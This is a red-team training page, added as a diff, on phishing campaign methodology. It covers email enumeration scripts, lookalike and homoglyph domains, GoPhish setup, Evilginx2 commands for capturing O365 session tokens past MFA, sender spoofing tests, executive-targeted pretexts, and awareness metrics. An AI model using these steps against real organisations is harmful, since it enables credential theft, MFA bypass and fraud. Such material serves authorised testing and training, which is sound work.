@@ -1,0 +1,265 @@
+---
+layout: training-page
+title: "Phishing Campaign Methodology — Red Team Academy"
+module: "Reporting"
+tags:
+  - phishing
+  - social-engineering
+  - campaign
+  - gophish
+  - spear-phishing
+  - awareness
+  - kpi
+page_key: "reporting-phishing-campaign"
+---
+<h1>Phishing Campaign Methodology</h1>
+
+  <p>Structured approach to planning, executing, and measuring phishing campaigns — covering both adversarial simulation (Red Team) and awareness/security testing engagements. The methodology distinguishes between broad phishing campaigns (test the full org), spear-phishing (targeted at specific roles or individuals), and credential harvesting (session token theft via reverse proxy). Each campaign type requires different tooling, templates, and success metrics.</p>
+
+  <h2>Preparation — Understanding the Target</h2>
+  <pre><code># Step 1 — Map the org's communication landscape:
+# - Primary internal channels: email, Slack, Teams, Zoom, WhatsApp
+# - Email structure: firstname.lastname@corp.com? first_last? f.last?
+# - Targeted vs. broadcast comms (does IT send org-wide emails? via which address?)
+# - Legitimate senders employees trust: IT Helpdesk, HR, Finance, CEO/EA
+
+# Step 2 — Identify the technology stack:
+# - Email platform: O365, Google Workspace, Exchange on-prem, hybrid
+# - Email security: SEG vendor (Proofpoint, Mimecast, etc.), spam filtering
+# - Identity provider: Azure AD, Okta, ADFS (important for credential harvesting)
+# - Endpoint: AV/EDR stack, browser, OS (affects link-click behaviour)
+# - Awareness tools already deployed: KnowBe4, Proofpoint SAT, PhishiX, ThreatCop
+
+# Step 3 — Check for existing ticket/helpdesk system:
+# - What does IT support email look like? (great pretext: "IT ticket update")
+# - Does the org use ServiceNow, Zendesk, Jira? (realistic ticket reference numbers)
+# - Incident reporting email — can you spoof it for a "security alert" pretext?
+
+# Step 4 — Enumerate email addresses:
+# hunter.io / clearbit / LinkedIn for format validation
+# Email permutator:
+python3 -c "
+names = [('John','Smith'),('Jane','Doe')]
+for f,l in names:
+    for fmt in [f'{f}.{l}',f'{f[0]}{l}',f'{f}_{l}',f'{f[0]}.{l}']:
+        print(f'{fmt}@corp.com'.lower())
+"
+
+# Verify format with SMTP:
+for email in emails.txt; do
+  python3 -c "import smtplib; s=smtplib.SMTP('mail.corp.com',25); \
+    print(s.verify('$email'))" 2&gt;&amp;1 | grep -i "250\|user"
+done</code></pre>
+
+  <h2>Phishing Infrastructure Setup</h2>
+  <pre><code># Domain selection:
+# - Register lookalike domain: corp-support.com, corp-helpdesk.net, it-corp.com
+# - Domain must be 30+ days old for good reputation
+# - Check against Alexa top 1M for conflicts
+# - spoofcheck.py corp.com — check if target domain is spoofable
+
+# DNS records for the phishing domain:
+# SPF:  v=spf1 ip4:SENDING_IP include:sendgrid.net ~all
+# DKIM: configure via mail provider (GoPhish supports DKIM signing)
+# DMARC: v=DMARC1; p=none; rua=mailto:dmarc@phishing-domain.com
+
+# Verify deliverability before campaign:
+# mail-tester.com — score must be 8+/10 before sending
+# glockapps.com — check delivery to major providers
+
+# GoPhish setup:
+# github.com/gophish/gophish
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish*.zip && chmod +x gophish
+./gophish  # Admin: https://localhost:3333 | Phishing: http://0.0.0.0:80
+
+# GoPhish configuration:
+# 1. Sending Profiles: SMTP server, from address, headers
+# 2. Landing Pages: credential capture or redirect page
+# 3. Email Templates: subject, body, tracking pixel, click link
+# 4. Users &amp; Groups: target list CSV (First Name, Last Name, Email, Position)
+# 5. Campaigns: link group + template + landing page + SMTP + schedule
+
+# Evilginx2 — reverse proxy for session token theft (bypasses MFA):
+# github.com/kgretzky/evilginx2
+evilginx2
+: phishlets hostname o365 login.microsoftonline.com.phishing-domain.com
+: phishlets enable o365
+: lures create o365
+: lures get-url 0  # copy this URL into phishing emails</code></pre>
+
+  <h2>Campaign Phases</h2>
+
+  <h3>Phase 1 — Broad Campaign (org-wide baseline)</h3>
+  <pre><code># First campaign: establish baseline click/compromise rate
+
+# Template selection — use generic, high-volume pretext themes:
+# - IT password expiry warning
+# - HR benefits enrollment deadline
+# - Shared document notification (OneDrive/Sharepoint)
+# - Delivery notification (FedEx, UPS, DHL)
+# - Multi-factor authentication setup required
+
+# Randomization strategy:
+# - Avoid sending same template to the whole org at once
+# - Split into groups of 50, send different templates per group
+# - Stagger sends across 1-2 weeks to avoid mass-detection
+
+# GoPhish campaign settings:
+# Send by date: schedule across 2 weeks
+# Use random template: run multiple campaigns with different templates
+# Track: email opened, link clicked, credential submitted, report submitted
+
+# Baseline metrics to capture:
+# Total targets:        N
+# Emails delivered:     N (bounces = hygiene issue)
+# Opened emails:        X% (benchmark: 30-40% typical)
+# Clicked links:        X% (benchmark: 10-20% typical)
+# Submitted credentials:X% (benchmark: 2-8% typical)
+# Reported phishing:    X% (goal: &gt;50% of recipients should report)</code></pre>
+
+  <h3>Phase 2 — Spear-Phishing (targeted)</h3>
+  <pre><code># Targets for spear-phishing:
+# - C-suite and their assistants (high access, high trust)
+# - Finance/AP team (wire transfer fraud pretext)
+# - IT admins (credential value)
+# - HR (payroll redirect, employee PII)
+# - Developers (code repo access, deploy keys)
+
+# LinkedIn reconnaissance for spear-phishing context:
+# linkedin2username.py -u you@email.com -c "Target Corp"
+# Review job postings: they reveal internal tool stack, processes
+# OSINT profile: recent travel, conference attendance, hobbies (pretexts)
+
+# High-value spear-phishing pretexts:
+# - "Your Okta account shows suspicious login — verify now"
+# - "HR has a question about your recent expense report [report number]"
+# - "[CEO name] needs you to review this document before the 3pm call"
+# - "GitHub security alert: your repo has a new collaborator added"
+
+# Spear-phishing email template components:
+# - Personalized greeting (full name, not "Dear User")
+# - Reference to real org context (tool name, process, person)
+# - Plausible urgency (not "ACT NOW!!!")
+# - Single clear call-to-action
+# - Signature matching a real internal sender format
+
+# Technical setup for targeted campaigns:
+# Use Evilginx2 for MFA bypass on C-suite / IT admins
+# Custom landing page that mirrors the exact SSO page they use
+# Track per-lure: different URL per target → per-person tracking</code></pre>
+
+  <h2>Domain Spoofing Check</h2>
+  <pre><code># Before running a spoofing-based campaign, verify feasibility:
+python3 spoofcheck.py target.com
+# PASS = SPF is missing or has ~all (softfail) — spoofing may work
+# FAIL = strict SPF + DMARC p=reject — spoofing will be blocked
+
+# If domain cannot be spoofed, use lookalike domains:
+# corp.com → c0rp.com (zero), corp-IT.com, corpsupport.com
+# Use Unicode lookalikes: аdmin.com (Cyrillic 'а') vs admin.com
+
+# Test email delivery from spoofed address to a personal inbox:
+# sendmail -f ceo@target.com test@gmail.com
+# swaks --to test@gmail.com --from ceo@target.com --server mail.target.com
+# Check if it lands in inbox vs. spam</code></pre>
+
+  <h2>During Campaign — Tracking &amp; Monitoring</h2>
+  <pre><code># GoPhish live dashboard:
+# - Monitor in real-time: email sent → opened → clicked → submitted
+# - Per-target timeline visible in campaign results
+# - Export to CSV for analysis
+
+# What to watch for:
+# - Mass reporting spike: employees reporting = good awareness, or you've been burned
+# - Security team "canary" email: many orgs add a security@ to every campaign list
+#   to detect phishing tests. If you get an alert from target's security team, the
+#   test is now a live deconfliction event.
+# - Email gateway blocks: if 0 opens after 100 sends, the domain is blocked
+
+# Adapting mid-campaign:
+# - Low open rate: test email deliverability, check SPF/DKIM, try different subject
+# - High open, low click: landing page mismatch, broken link, URL pre-scan eating clicks
+# - Link click but no cred submit: landing page not convincing, MFA blocking
+
+# Credential harvesting — what to store:
+# For awareness campaigns: log email, timestamp, credential submitted (YES/NO)
+# Do NOT store actual passwords — hash them or record only username + "credential submitted"
+# For Red Team simulation: you need the real credential to prove impact</code></pre>
+
+  <h2>Post-Campaign — Awareness and Reporting</h2>
+  <pre><code># Immediate post-campaign actions (same day results are finalized):
+
+# 1. Notify via primary communication channels:
+# - Intranet post: "We just ran a phishing simulation. Here's what we found."
+# - Slack/Teams: post in #general or #security
+# - Include: what percentage clicked, what to look for, how to report
+
+# 2. Create awareness content:
+# - Genially interactive module explaining indicators in the phishing email
+# - Short video walkthrough (3 min max) — what made this email suspicious
+# - Poster/slide: "5 red flags in the phishing email we just sent"
+
+# 3. Mandatory training for those who submitted credentials:
+# - KnowBe4/Proofpoint SAT: auto-enroll in 15-min phishing awareness module
+# - Direct manager notification (only if engagement scope includes this)
+# - Re-test within 30 days to measure training impact
+
+# 4. Recognition for reporters:
+# - Public shoutout for those who reported (builds positive security culture)
+# - Gamification: leaderboard, "phishing champion" badge
+
+# KPI template:
+# Campaign: [Name]   Date: [YYYY-MM-DD]   Scope: [Dept/Org]
+# -------------------------------------------------------
+# Total targets:              [N]
+# Emails delivered:           [N] ([X]%)
+# Emails opened:              [N] ([X]%)  ← baseline awareness indicator
+# Links clicked:              [N] ([X]%)  ← susceptibility rate
+# Credentials submitted:      [N] ([X]%)  ← compromise rate
+# Phishing reported:          [N] ([X]%)  ← reporting rate (goal &gt;50%)
+# Senior mgmt compromised:    [N]         ← executives clicked / submitted
+# Time to first report:       [HH:MM]     ← detection speed
+# -------------------------------------------------------
+# Benchmark vs. previous:     Click rate: [X]% → [X]% ([+/-Y]%)
+# Benchmark vs. industry:     [reference: Verizon DBIR, KnowBe4 annual report]
+
+# Trend tracking (quarterly):
+# - Click rate should decline campaign-over-campaign with good training
+# - Report rate should increase
+# - Target: &lt;5% click rate, &gt;70% report rate after 12 months</code></pre>
+
+  <h2>Phishing Tools Reference</h2>
+  <pre><code># Campaign management:
+#   GoPhish:    github.com/gophish/gophish         (open source, self-hosted)
+#   KnowBe4:    commercial, integrated training
+#   Proofpoint: commercial, integrated with their SEG
+#   Lucy:       commercial, more templates and automation
+
+# MFA bypass / session token theft:
+#   Evilginx2:  github.com/kgretzky/evilginx2      (reverse proxy, phishlets)
+#   Modlishka:  github.com/drk1wi/Modlishka        (transparent reverse proxy)
+
+# O365-specific attacks:
+#   o365-attack-toolkit: github.com/mdsecactivebreach/o365-attack-toolkit
+#   PwnAuth:    github.com/fireeye/PwnAuth          (OAuth abuse campaigns)
+
+# Infrastructure:
+#   pwndrop:    github.com/kgretzky/pwndrop         (payload hosting)
+#   RedGuard:   github.com/wikiZ/RedGuard           (C2 front flow control)
+
+# OSINT / email enumeration:
+#   hunter.io               (email format discovery, verification)
+#   linkedin2username:      github.com/initstring/linkedin2username
+#   spoofcheck:             github.com/BishopFox/spoofcheck</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>Red-Team-Management / Phishing Campaign — <code>github.com/J0hnbX/RedTeam-Resources</code></li>
+    <li>GoPhish documentation — <code>docs.getgophish.com</code></li>
+    <li>Evilginx2 — <code>github.com/kgretzky/evilginx2</code></li>
+    <li>KnowBe4 Phishing Industry Benchmarks — <code>knowbe4.com/resources/phishing-industry-benchmarks</code></li>
+    <li>Verizon DBIR (social engineering stats) — <code>verizon.com/business/resources/reports/dbir</code></li>
+    <li>Related: <a href="/recon/email-recon/">Email Reconnaissance</a></li>
+    <li>Related: <a href="/reporting/red-team-operations-framework/">Red Team Operations Framework</a></li>
+  </ul>
